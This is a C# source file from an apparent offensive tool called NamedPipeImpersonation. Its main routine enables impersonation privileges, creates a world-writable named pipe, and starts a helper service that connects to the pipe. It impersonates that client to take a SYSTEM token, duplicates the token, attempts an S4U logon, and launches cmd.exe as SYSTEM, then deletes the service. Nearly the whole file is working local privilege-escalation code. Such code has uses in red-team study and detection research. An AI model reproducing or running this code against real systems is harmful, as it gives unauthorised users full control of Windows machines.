﻿using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using NamedPipeImpersonation.Interop;

namespace NamedPipeImpersonation.Library
{
    internal class Modules
    {
        public static bool GetSystemWithNamedPipe()
        {
            bool status;
            var isImpersonated = false;

            do
            {
                int error;
                string pipeMessage;
                string s4uUser = Environment.UserName;
                string s4uDomain = Environment.UserDomainName;
                var hPrimaryToken = IntPtr.Zero;
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                    lpDesktop = @"Winsta0\Default"
                };
                var pipeSecurity = new PipeSecurity();
                var accessRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
                pipeSecurity.AddAccessRule(accessRule);

                Console.WriteLine("[>] Trying to enable required privileges.");

                status = Utilities.EnableTokenPrivileges(
                    new List<string> { Win32Consts.SE_IMPERSONATE_NAME },
                    out Dictionary<string, bool> adjustedPrivs);

                foreach (var priv in adjustedPrivs)
                {
                    if (priv.Value)
                        Console.WriteLine("[+] {0} is enabled successfully.", priv.Key);
                    else
                        Console.WriteLine("[-] {0} is not available.", priv.Key);
                }

                if (!status)
                    break;

                using (var pipeServer = new NamedPipeServerStream(
                    Globals.serviceName,
                    PipeDirection.InOut,
                    100,
                    PipeTransmissionMode.Byte,
                    PipeOptions.None,
                    1024,
                    1024,
                    pipeSecurity))
                {
                    Console.WriteLine(@"[*] Created Named Pipe Server @ \\.\pipe\{0}", Globals.serviceName);

                    using (var pipeReader = new StreamReader(pipeServer))
                    using (var hPipe = pipeServer.SafePipeHandle)
                    {
                        var serviceThread = new Thread(new ThreadStart(ServiceThreadProc));

                        Console.WriteLine("[*] Waiting for client connection...");

                        serviceThread.Start();
                        pipeServer.WaitForConnection();
                        pipeMessage = pipeReader.ReadToEnd();
                        Globals.isPipeConnected = true;

                        if (Helpers.CompareIgnoreCase(pipeMessage, "timeout"))
                        {
                            Console.WriteLine("[-] Timeout. Maybe blocked by anti-virus.");
                        }
                        else if (NativeMethods.ImpersonateNamedPipeClient(hPipe))
                        {
                            isImpersonated = (Environment.UserName.Length != 0);

                            if (isImpersonated)
                            {
                                string accountName;
                                Helpers.GetTokenUserName(out string upn, out string domain, out string stringSid, out SID_NAME_USE _);

                                if (!string.IsNullOrEmpty(upn) && !string.IsNullOrEmpty(domain))
                                    accountName = string.Format(@"{0}\{1}", domain, upn);
                                else if (!string.IsNullOrEmpty(upn))
                                    accountName = upn;
                                else if (!string.IsNullOrEmpty(domain))
                                    accountName = domain;
                                else
                                    accountName = "N/A";

                                if (string.IsNullOrEmpty(stringSid))
                                    stringSid = "N/A";

                                Console.WriteLine("[+] Impersonated as \"{0}\" (SID: {1}).", accountName, stringSid);

                                status = NativeMethods.DuplicateTokenEx(
                                    WindowsIdentity.GetCurrent().Token,
                                    ACCESS_MASK.MAXIMUM_ALLOWED,
                                    IntPtr.Zero,
                                    SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
                                    TOKEN_TYPE.TokenPrimary,
                                    out hPrimaryToken);

                                if (!status)
                                {
                                    error = Marshal.GetLastWin32Error();
                                    Console.WriteLine("[-] Failed to get primary SYSTEM token.");
                                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                                    break;
                                }
                            }
                            else
                            {
                                Console.WriteLine("[-] Failed to named pipe impersonation.");
                            }
                        }
                        else
                        {
                            error = Marshal.GetLastWin32Error();
                            Console.WriteLine("[-] Failed to named pipe impersonation.");
                            Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                        }
                    }
                }

                if (Globals.hService != IntPtr.Zero)
                {
                    Console.WriteLine("[>] Deleting named pipe client service.");

                    if (!NativeMethods.DeleteService(Globals.hService))
                    {
                        Console.WriteLine("[-] Failed to delete named pipe client servce.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                    }
                    else
                    {
                        Console.WriteLine("[+] Named pipe client service is deleted successfully.");
                    }
                }

                if (!isImpersonated)
                {
                    break;
                }
                else
                {
                    Console.WriteLine("[>] Trying to S4U logon.");

                    status = Utilities.Msv4S4uLogonImpersonation(s4uUser, s4uDomain);

                    if (!status)
                    {
                        error = Marshal.GetLastWin32Error();
                        Console.WriteLine("[-] Failed to S4U logon.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[+] S4U logon is successful.");
                    }
                }

                Console.WriteLine("[>] Trying to spawn token assigned shell.");

                status = NativeMethods.CreateProcessAsUser(
                    hPrimaryToken,
                    null,
                    @"C:\Windows\System32\cmd.exe",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.NONE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInformation);
                NativeMethods.NtClose(hPrimaryToken);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to spawn SYSTEM shell.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                }
                else
                {
                    Console.WriteLine("[+] SYSTEM shell is executed succcessfully.");

                    NativeMethods.NtWaitForSingleObject(processInformation.hThread, true, IntPtr.Zero);
                    NativeMethods.NtClose(processInformation.hThread);
                    NativeMethods.NtClose(processInformation.hProcess);
                }
            } while (false);

            if (isImpersonated)
                NativeMethods.RevertToSelf();
            else
                Console.WriteLine("[-] Failed to GetSystem.");

            Console.WriteLine("[*] Done.");

            return status;
        }


        private static void ServiceThreadProc()
        {
            Console.WriteLine("[>] Trying to create and start named pipe client service.");
            Console.WriteLine("    [*] Service Name : {0}", Globals.serviceName);

            Thread.Sleep(100);
            Globals.hService = Utilities.StartNamedPipeClientService(Globals.serviceName);

            if (Globals.hService == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to start named pipe client service.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
            }
            else
            {
                Console.WriteLine("[+] Named pipe client service is started successfully.");

                Thread.Sleep(Globals.timeout);

                if (!Globals.isPipeConnected)
                {
                    try
                    {
                        using (var pipeClient = new NamedPipeClientStream(".", Globals.serviceName, PipeDirection.Out))
                        {
                            var message = Encoding.ASCII.GetBytes("timeout");
                            pipeClient.Connect();
                            pipeClient.Write(message, 0, message.Length);
                        }
                    }
                    catch { }
                }
            }
        }
    }
}
